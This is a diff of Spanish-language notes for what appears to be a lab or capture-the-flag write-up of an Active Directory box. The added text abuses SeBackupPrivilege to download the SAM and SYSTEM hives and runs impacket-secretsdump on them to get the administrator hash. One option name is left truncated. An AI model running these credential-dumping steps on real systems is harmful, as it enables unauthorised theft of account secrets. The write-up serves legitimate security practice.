@@ -1,4 +1,4 @@
-#AD 
+#AD #PasswordSpraying #SeBackupPrivilege #CredentialDumping #SAM #SYSTEM
 # Enumeración
 
 Hacemos una enumeración inicial de puertos con [[00.- Herramientas/NMAP|NMAP]]
@@ -373,7 +373,8 @@ Vemos que tenemos privilegios que no deben de estar como por ejemplo `SeBackupPr
 
 Buscamos en el navegador como abusar de el, encontramos un repositorio de github `https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md`
 
-En el que se explica paso por paso la escalada de privilegios
+En el que se explica paso por paso la escalada de privilegios explotando la vulnerabilidad
+## Credential Dumping
 
 - Primero deberemos crear un directorio `/temp` 
 	```shell
@@ -398,7 +399,9 @@ download sam.hive
  download system.hive
  ```
 
- 
+ Usaremos [[IMPACKET]] pasandole las opciones de 
+ - `-sam` para pasarle la `SAM` descargada
+ - `-syste`
   `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`
 
 Obtenmiendo asi el hash del usuario administrador 
